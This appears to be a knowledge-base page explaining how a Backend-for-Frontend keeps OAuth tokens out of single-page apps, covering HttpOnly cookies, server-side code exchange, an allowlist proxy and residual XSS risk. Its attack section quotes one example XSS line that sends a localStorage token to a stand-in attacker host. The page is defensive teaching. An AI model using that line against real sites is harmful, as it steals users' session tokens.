---
title: How does a BFF protect against token theft in SPAs?
type: question
question_tier: conceptual
domain: keycloak
slug: bff-token-theft-spa
summary: "A Backend-for-Frontend eliminates XSS-based token theft by running the OAuth flow server-side, storing tokens on the server, and exposing only encrypted HttpOnly cookies to the browser."
sources:
  - web:https://www.ietf.org/archive/id/draft-ietf-oauth-browser-based-apps-26.html (BBA-26, fetched 2026-06-17)
  - web:https://curity.io/resources/learn/the-bff-pattern/ (Curity BFF, fetched 2026-06-17)
  - web:https://curity.io/resources/learn/token-handler-overview/ (Curity Token Handler, fetched 2026-06-17)
provenance:
  extracted: 7
  inferred: 1
  ambiguous: 0
tags: [tokens]
status: reviewed
updated: 2026-07-07
graph_community: "Tokens & Sessions"
---

# How does a Backend-for-Frontend (BFF) protect against token theft in SPAs?

**The BFF removes tokens from the browser's reachable memory entirely, so XSS cannot steal them.**

## The attack BFF defeats

In a browser-only SPA using Authorization Code + PKCE, the tokens (access, refresh, ID) land in JavaScript-accessible storage — in-memory variables, `sessionStorage`, or `localStorage`. Any XSS vulnerability — a stored script, a DOM-injection gadget, a supply-chain compromise of a dependency — runs arbitrary JS that can `fetch('//attacker/?t='+localStorage.getItem('token'))` and exfiltrate tokens silently. Because bearer tokens are self-validating, the attacker can replay them from anywhere until expiry or revocation, gaining full access to the user's data ([[token-storage-browser]]).

## How BFF defeats it

Three structural properties, all enforced server-side:

1. **Confidential server holds all OAuth credentials.** The BFF is registered as a confidential OAuth client at the authorization server. It alone possesses the `client_secret`, private-key JWT, or mTLS certificate. The SPA is a public client — it never sees a client credential and never hits the AS token endpoint. The BFF runs the entire Authorization Code + PKCE flow server-side ([[bff-token-handler]]:33-34).

2. **Tokens never reach JavaScript.** After the BFF completes the code exchange, it encrypts the access, refresh, and ID tokens and writes them into an `HttpOnly` + `Secure` + `SameSite=Strict` cookie. No token value appears in any JSON response body, no `Set-Cookie` with a JWT in plaintext, no `localStorage.setItem` call. The browser attaches the cookie automatically on subsequent requests; JavaScript cannot read it because the `HttpOnly` flag is set ([[bff-token-handler]]:36-37).

3. **BFF proxies all API calls through an allowlist.** The SPA sends same-origin requests to the BFF's own endpoints (`/api/*`). The BFF decrypts the cookie, attaches the bearer token, and forwards to the upstream resource server — but only if the target URL is on a server-side allowlist. An XSS payload can replay the session cookie against the BFF, but only against the BFF's own allowed endpoints, not arbitrary origins ([[bff-token-handler]]:39-40).

## What residual risk remains

A BFF does **not** eliminate XSS impact. A successful injection can still:
- Make authenticated calls to the BFF's allowed API surface
- Exfiltrate rendered page data by reading the DOM
- Deface or phish the user within the session

The BFF limits blast radius from *unlimited token replay* to *bounded API calls within the allowlist* (BBA-26 §5.1.4). CSP, input validation, and output encoding remain mandatory ([[bff-token-handler]]:113).

## Comparison: token-mediating backend (weaker alternative)

BBA-26 §6.2 describes a weaker pattern where the backend retains the refresh token but returns the access token to the browser. This still exposes the access token to XSS exfiltration (BBA-26 §5.1.1/§5.1.2). A full BFF with encrypted HttpOnly cookies is strictly stronger.

## References

**RH ground-truth / upstream sources:**
- BBA-26 §6.1 (§6.1.3.1–6.1.3.6): BFF as preferred SPA architecture — confidential client, HttpOnly cookies, allowlist proxy, CSRF defence
- BBA-26 §5.1.4 → §5.2.3: Residual XSS risk even with BFF
- Curity Token Handler §"OAuth Agent Cookies": encrypted HttpOnly login-state and session cookies
- Curity BFF §"Different Deployment Options": same-parent-domain hosting requirement

**Wiki pages:**
- [[bff-token-handler]] — full BFF/token-handler reference
- [[token-storage-browser]] — why no browser token store is XSS-safe
- [[oidc-client-best-practices]] — how to write correct OIDC client code for any app type
- [[cors-for-spa]] — CORS enforcement complementary to BFF
- [[dpop]] / [[mtls-bound-tokens]] — sender-constraining for tokens that do leave the server
